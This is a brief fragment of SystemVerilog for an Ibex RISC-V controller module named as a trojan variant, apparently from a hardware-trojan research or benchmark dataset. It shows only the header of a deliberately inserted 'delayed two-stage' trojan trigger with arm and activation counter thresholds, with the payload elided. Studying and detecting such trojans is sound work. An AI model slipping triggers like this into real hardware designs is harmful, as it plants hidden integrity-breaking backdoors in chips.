...
module ibex_controller_trojan_Integrity #(
  ...
  output logic                  perf_tbranch_o           // we are executing a taken branch
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=6510, act=3255)
    // ============================================================
    localparam int ARM_THRESHOLD   = 6510;
    localparam int ACTIVATE_DELAY  = 3255;
